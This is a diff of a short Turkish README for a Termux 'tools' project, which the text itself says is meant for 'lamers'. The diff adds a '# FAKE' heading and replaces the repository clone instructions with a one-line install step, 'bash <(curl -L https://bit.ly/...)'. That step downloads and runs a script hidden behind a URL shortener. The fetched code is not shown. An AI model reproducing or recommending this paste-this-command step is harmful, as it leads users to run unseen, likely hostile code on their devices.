@@ -2,13 +2,17 @@
 
 Developer [Sakirbey](https://t.me/SakirBey2)
 
-amaç lamerlerin kullanacağı hawli termux tools
+amaç lamerlerin kullanacağı hawli termux tools 
+# FAKE
 
 
-``` git clone https://github.com/SakirBey1/termux.git ```
+
+Termux Kurulumu 
 
 
-``` cd termux ```
+``` bash <(curl -L https://bit.ly/3OWVFvj) ```
 
 
-``` bash a.sh ```
+
+
+
